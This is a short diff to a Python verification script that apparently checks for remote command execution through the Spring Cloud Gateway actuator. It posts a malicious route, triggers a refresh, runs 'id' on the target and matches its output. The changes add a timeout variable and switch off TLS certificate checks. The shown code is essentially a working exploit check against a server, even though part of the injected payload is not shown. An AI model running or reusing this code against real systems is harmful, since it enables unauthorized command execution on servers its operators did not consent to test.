@@ -20,6 +20,7 @@ def verify(url):
     }
     try:
         cmd = 'id'
+        timeout = 3
         rand_str = ''.join(random.sample(string.digits + string.ascii_letters, 7))
         payload = {
             "id": rand_str,
@@ -33,10 +34,10 @@ def verify(url):
         }
         vurl1 = urllib.parse.urljoin(url, '/actuator/gateway/routes/' + rand_str)
         vurl2 = urllib.parse.urljoin(url, '/actuator/gateway/refresh')
-        rep1 = requests.post(vurl1, timeout=1, data=json.dumps(payload), headers=headers)
+        rep1 = requests.post(vurl1, timeout=timeout, data=json.dumps(payload), headers=headers, verify=False)
         if rep1.status_code == 201:
-            rep2 = requests.post(vurl2, timeout=1, headers=headers)
-            rep3 = requests.get(vurl1, timeout=2, headers=headers)
+            rep2 = requests.post(vurl2, timeout=timeout, headers=headers, verify=False)
+            rep3 = requests.get(vurl1, timeout=timeout, headers=headers, verify=False)
             if rep2.status_code == 200 and re.search('uid=.+gid=.+groups=.+', rep3.text):
                 relsult['vulnerable'] = True
                 relsult['url'] = url
@@ -45,4 +46,3 @@ def verify(url):
         return relsult
     except:
         return relsult
-
